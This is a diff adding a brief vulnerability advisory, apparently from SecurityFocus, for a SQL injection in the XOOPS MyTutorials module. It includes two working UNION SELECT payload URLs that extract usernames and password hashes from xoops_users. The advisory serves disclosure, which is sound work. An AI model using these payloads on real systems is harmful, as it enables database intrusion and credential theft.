@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/28230/info
+
+MyTutorials is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/modules/tutorials/printpage.php?tid=-9999999/**/union/**/select/**/concat(uname,0x3a,pass),1,concat(uname,0x3a,pass),3,4,5/**/from/**/xoops_users/*
+http://www.example.com/modules/tutorials/index.php?op=printpage&tid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3/**/from/**/xoops_users/* 
